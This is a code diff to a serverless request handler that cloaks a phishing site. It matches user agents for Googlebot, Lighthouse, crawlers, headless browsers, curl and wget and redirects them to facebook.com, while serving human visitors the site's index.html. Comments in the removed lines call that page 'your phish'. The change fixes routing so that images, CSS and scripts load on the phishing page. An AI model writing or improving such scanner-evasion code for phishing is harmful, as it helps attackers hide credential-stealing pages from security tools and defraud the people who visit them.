@@ -1,5 +1,6 @@
 export default async function handler(req) {
     const ua = req.headers['user-agent'] || '';
+    const url = new URL(req.url);
 
     // 🛡️ SERVER-SIDE BOT BLOCK (Before JS loads)
     const botPatterns = /Googlebot|Lighthouse|Chrome-Lighthouse|bot|crawler|spider|robot|headless|wget|curl/i;
@@ -8,11 +9,15 @@ export default async function handler(req) {
         return Response.redirect('https://www.facebook.com', 302);
     }
 
-    // Human → Pass to your phishing index.html
-    const phishUrl = new URL(req.url);
-    phishUrl.pathname = '/index.html'; // Serve your phish
+    // Fix: Only serve index.html for root or non-file paths
+    // If it's a request for an image, css, or script, don't force index.html
+    const isFile = url.pathname.includes('.');
 
-    return fetch(phishUrl.toString(), {
+    if (!isFile || url.pathname === '/') {
+        url.pathname = '/index.html';
+    }
+
+    return fetch(url.toString(), {
         method: req.method,
         headers: req.headers,
         body: req.body
